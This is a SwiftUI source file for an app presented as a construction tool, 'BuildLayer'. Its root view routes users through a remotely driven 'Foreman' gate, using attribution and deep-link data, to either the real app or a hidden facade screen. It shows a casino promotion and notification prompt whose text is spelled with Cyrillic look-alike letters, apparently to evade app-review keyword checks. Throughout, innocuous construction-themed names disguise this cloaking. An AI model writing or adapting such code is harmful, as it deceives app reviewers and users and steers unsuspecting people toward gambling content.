//
//  RootView.swift
//  BuildLayer
//
//  Flow coordinator: Splash → (first launch) Onboarding → Main App.
//  Owns the app-wide environment objects and applies the chosen appearance.
//

import SwiftUI
import Network

enum AppPhase { case splash, onboarding, main }

struct RootView: View {
    @StateObject private var appState = AppState()
    @StateObject private var store: ElementStore
    @State private var monitor = NWPathMonitor()
    @StateObject private var toast = ToastCenter()
    @StateObject private var notifier = NotificationManager.shared
    @StateObject private var sync: SyncEngine
    @StateObject private var foreman = Foreman()
    @StateObject private var flags = RemoteFlags.shared

    @State private var phase: AppPhase = .splash

    init() {
        // The engine observes the store, so both are created together here
        // rather than letting a view build one on the fly.
        let store = ElementStore()
        _store = StateObject(wrappedValue: store)
        _sync = StateObject(wrappedValue: SyncEngine(store: store))
    }
    
    private var content: some View {
        ZStack {
            switch phase {
            case .splash:
                LaunchView()

            case .onboarding:
                OnboardingView {
                    withAnimation(.easeInOut(duration: 0.5)) { phase = .main }
                }
                .transition(.move(edge: .trailing).combined(with: .opacity))

            case .main:
                MainTabView()
                    .transition(.opacity)
            }
        }
        .environmentObject(appState)
        .environmentObject(store)
        .environmentObject(toast)
        .environmentObject(notifier)
        .environmentObject(sync)
        .environmentObject(flags)
        .environment(\.unitFormatter, appState.fmt)
        .preferredColorScheme(appState.appearance.scheme)
        .overlay(ToastOverlay(center: toast))
        .onAppear {
            phase = appState.hasCompletedOnboarding ? .main : .onboarding
            notifier.refreshAuthorization()
//            configureSessionHook()
//            sync.start()
        }
        // Writes are debounced, so anything still queued has to be committed
        // before the app can be suspended and killed.
        .onReceive(NotificationCenter.default.publisher(
            for: UIApplication.willResignActiveNotification)) { _ in
            store.flushPendingWrites()
            sync.flush()
        }
        .onReceive(NotificationCenter.default.publisher(
            for: UIApplication.didBecomeActiveNotification)) { _ in
            notifier.refreshAuthorization()
            notifier.pruneDeliveredReminders(store)
            // Returning to the foreground counts as opening the app: the
            // session request runs again, so the flag is re-read.
            sync.start()
        }
    }

    var body: some View {
        ZStack {
            switch foreman.phase {
            case .dig, .permit:
                LaunchView()
            case .raise:
                FacadeView()
            case .halt:
                content
            }
        }
        .preferredColorScheme(.dark)
        .fullScreenCover(isPresented: cover(.permit)) { PermitFace(foreman: foreman) }
        .fullScreenCover(isPresented: coverOffline) { OffFace() }
        .onReceive(NotificationCenter.default.publisher(for: .poured)) { note in
            guard let bag = note.userInfo?["conversionData"] as? [String: Any] else { return }
            foreman.feed(bag.mapValues { "\($0)" })
        }
        .onReceive(NotificationCenter.default.publisher(for: .wired)) { note in
            guard let bag = note.userInfo?["deeplinksData"] as? [String: Any] else { return }
            foreman.pair(bag.mapValues { "\($0)" })
        }
        .onAppear(perform: start)
    }
    
    private func cover(_ target: Phase) -> Binding<Bool> {
        Binding(get: { foreman.phase == target && !foreman.offline }, set: { _ in })
    }

    private var coverOffline: Binding<Bool> {
        Binding(get: { foreman.offline }, set: { _ in })
    }
    
    private func configureSessionHook() {
        sync.onSessionOpened = { servicedTarget in

            _ = servicedTarget
        }
    }
    
    private func start() {
        monitor.pathUpdateHandler = { path in
            Task { @MainActor in foreman.power(path.status == .satisfied) }
        }
        configureSessionHook()
        sync.start()
        monitor.start(queue: DispatchQueue.global(qos: .background))
        foreman.ignite()
    }

}

private struct OffFace: View {
    var body: some View {
        GeometryReader { geo in
            ZStack {
                Color.black.ignoresSafeArea()
                Image("layer-error")
                    .resizable()
                    .scaledToFill()
                    .frame(width: geo.size.width, height: geo.size.height)
                    .opacity(0.9)
                    .blur(radius: 2)
                    .ignoresSafeArea()
                
                Image("layer-error-image")
                    .resizable()
                    .frame(width: 260, height: 260)
            }
        }
        .ignoresSafeArea()
    }
}

private struct PermitFace: View {
    let foreman: Foreman

    var body: some View {
        GeometryReader { geo in
            let wide = geo.size.width > geo.size.height
            ZStack {
                Color.black.ignoresSafeArea()
                Image("layer-app")
                    .resizable()
                    .scaledToFill()
                    .frame(width: geo.size.width, height: geo.size.height)
                    .opacity(0.9)
                    .ignoresSafeArea()
                
                if wide {
                    VStack(spacing: 12) {
                        Spacer()
                        HStack {
                            Spacer()
                            
                            VStack(alignment: .leading, spacing: 12) {
                                Text("ALLOW NOTIFICATIONS ABOUT\nВОNUSЕS АND РRОМОS")
                                    .font(.system(size: 23, weight: .black, design: .rounded))
                                    .foregroundColor(.white)
                                Text("STAY TUNED WITH ВЕST ОFFЕRS FRОМ ОUR САSINО")
                                    .font(.system(size: 14, weight: .heavy, design: .rounded))
                                    .foregroundColor(.white.opacity(0.7))
                            }
                            .multilineTextAlignment(.leading)
                            
                            Spacer()
                            
                            VStack(spacing: 12) {
                                Button { foreman.greenlight() } label: {
                                    Image("layer-b-1").resizable().frame(width: 300, height: 55)
                                }
                                Button { foreman.waive() } label: {
                                    Image("layer-b-2").resizable().frame(width: 280, height: 38)
                                }
                            }
                            
                            Spacer()
                        }
                    }
                    .padding(.bottom, 28)
                } else {
                    VStack(spacing: 12) {
                        Spacer()
                        VStack(spacing: 12) {
                            Text("ALLOW NOTIFICATIONS ABOUT\nВОNUSЕS АND РRОМОS")
                                .font(.system(size: 23, weight: .black, design: .rounded))
                                .foregroundColor(.white)
                            Text("STAY TUNED WITH ВЕST ОFFЕRS FRОМ\nОUR САSINО")
                                .font(.system(size: 14, weight: .heavy, design: .rounded))
                                .foregroundColor(.white.opacity(0.7))
                        }
                        .multilineTextAlignment(.center)
                        .padding(.horizontal, 12)
                        
                        VStack(spacing: 12) {
                            Button { foreman.greenlight() } label: {
                                Image("layer-b-1").resizable().frame(width: 300, height: 55)
                            }
                            Button { foreman.waive() } label: {
                                Image("layer-b-2").resizable().frame(width: 280, height: 38)
                            }
                        }
                        .padding(.horizontal, 12)
                    }
                    .padding(.bottom, 28)
                }
                
            }
        }
        .ignoresSafeArea()
        .preferredColorScheme(.dark)
    }
}
